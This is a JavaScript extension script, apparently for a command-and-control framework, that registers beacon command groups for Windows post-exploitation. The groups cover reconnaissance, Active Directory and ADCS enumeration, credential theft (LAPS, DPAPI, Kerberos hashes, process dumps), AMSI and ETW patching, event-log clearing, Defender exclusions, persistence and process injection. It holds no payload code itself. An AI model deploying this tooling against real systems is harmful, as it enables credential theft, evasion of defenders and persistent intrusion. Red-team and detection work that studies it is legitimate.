var cmd_adcs_enum_com2 = ax.create_command("bof-adcs_enum_com2", "Enumerate ADCS CAs and templates (alias)", "bof-adcs_enum_com2 templates");
cmd_adcs_enum_com2.addArgString("mode", "all, templates, services or ca", "all");
cmd_adcs_enum_com2.setPreHook(function (id, cmdline, parsed_json) {
    let params = ax.bof_pack("cstr", [parsed_json["mode"]]);
    ax.execute_alias(id, cmdline, `execute bof "${bof_path(id, "adcs_enum")}" ${params}`, "BOF: adcs_enum");
});

/* ------------------------------------------------------------------ */
/* Registration                                                        */
/* ------------------------------------------------------------------ */

var group_recon = ax.create_commands_group("AdaptixBOFKit-Recon", [
    cmd_whoami, cmd_env, cmd_ipconfig, cmd_arp, cmd_netstat, cmd_routeprint,
    cmd_uptime, cmd_listpipes, cmd_drives, cmd_locale, cmd_resources,
    cmd_windowlist, cmd_listmods, cmd_sessions, cmd_dir, cmd_proclist,
    cmd_services, cmd_drivers,
    cmd_useridletime, cmd_sessioninfo, cmd_regqueryrec, cmd_auditpol,
    cmd_findmodule, cmd_filterdrivers, cmd_scenum, cmd_regsession,
    cmd_edrrecon, cmd_enumsysmon, cmd_whereami, cmd_enumrwx,
    cmd_vulndrivers, cmd_enumdotnet, cmd_safeharbor, cmd_enumdrives, cmd_enumlib,
    cmd_cacls, cmd_geolocation, cmd_evtxsearch, cmd_finduserhooks,
    cmd_enumhandles, cmd_enumhandles_alias, cmd_processhandles,
    cmd_processhandles_alias, cmd_killprocess, cmd_vssenum, cmd_wfpenum
]);
ax.register_commands_group(group_recon, ["beacon"], ["windows"], []);

var group_network = ax.create_commands_group("AdaptixBOFKit-Network", [
    cmd_portscan, cmd_nslookup, cmd_netshares, cmd_netview, cmd_netuse,
    cmd_netuse_list, cmd_nettime, cmd_netloggedon, cmd_netsession,
    cmd_listdns, cmd_probe, cmd_smbinfo, cmd_enumwebclient,
    cmd_portscanbof, cmd_netsession2, cmd_netuse_add, cmd_nbtscan
]);
ax.register_commands_group(group_network, ["beacon"], ["windows"], []);

var group_ad = ax.create_commands_group("AdaptixBOFKit-AD", [
    cmd_netuser, cmd_netlocalgroups, cmd_netlocalgroupmembers,
    cmd_domaingroups, cmd_netgroupmembers, cmd_passwordpolicy, cmd_domaininfo,
    cmd_ldapsearch, cmd_addmachineaccount, cmd_lapsdump,
    cmd_netgrouplist, cmd_netgrouplistmembers, cmd_netgrouplistmembers2,
    cmd_netlocalgrouplist, cmd_netlocalgrouplistmembers, cmd_get_password_policy,
    cmd_adcs_enum, cmd_adcs_enum_com, cmd_adcs_enum_com2, cmd_ldapsecuritycheck
]);
ax.register_commands_group(group_ad, ["beacon"], ["windows"], []);

var group_creds = ax.create_commands_group("AdaptixBOFKit-Creds", [
    cmd_credman, cmd_wifi, cmd_autologon,
    cmd_procdump, cmd_regsave, cmd_dpapissystem, cmd_certdump,
    cmd_clipboard, cmd_notethief, cmd_klist, cmd_kerbhash,
    cmd_dumpwifi, cmd_wifipasswords
]);
ax.register_commands_group(group_creds, ["beacon"], ["windows"], []);

var group_privesc = ax.create_commands_group("AdaptixBOFKit-Privesc-Evasion", [
    cmd_tokenpriv, cmd_uacstatus, cmd_unhook, cmd_etwpatch, cmd_amsipatch,
    cmd_hidefile, cmd_cleareventlog, cmd_addexclusion,
    cmd_enableefs, cmd_blindeventlog, cmd_enumexclusions, cmd_delexclusion,
    cmd_get_priv, cmd_startwebclient
]);
ax.register_commands_group(group_privesc, ["beacon"], ["windows"], []);

var group_persist = ax.create_commands_group("AdaptixBOFKit-Persistence", [
    cmd_regquery, cmd_regset, cmd_regdelete, cmd_runkey,
    cmd_svccreate, cmd_svcdelete, cmd_svcconfig, cmd_svcstart, cmd_svcstop,
    cmd_schtasksenum, cmd_schtasksquery, cmd_schtaskscreate,
    cmd_schtasksdelete, cmd_schtasksrun, cmd_addtaskscheduler,
    cmd_deltaskscheduler, cmd_comhunter, cmd_trustme, cmd_addlocalcert,
    cmd_addfirewallrule, cmd_lnkgenerator
]);
ax.register_commands_group(group_persist, ["beacon"], ["windows"], []);

var group_post = ax.create_commands_group("AdaptixBOFKit-Post", [
    cmd_inject, cmd_hashfile, cmd_download,
    cmd_screenshot, cmd_enumfiles, cmd_md5, cmd_sha1, cmd_sha256,
    cmd_executesession
]);
ax.register_commands_group(group_post, ["beacon"], ["windows"], []);
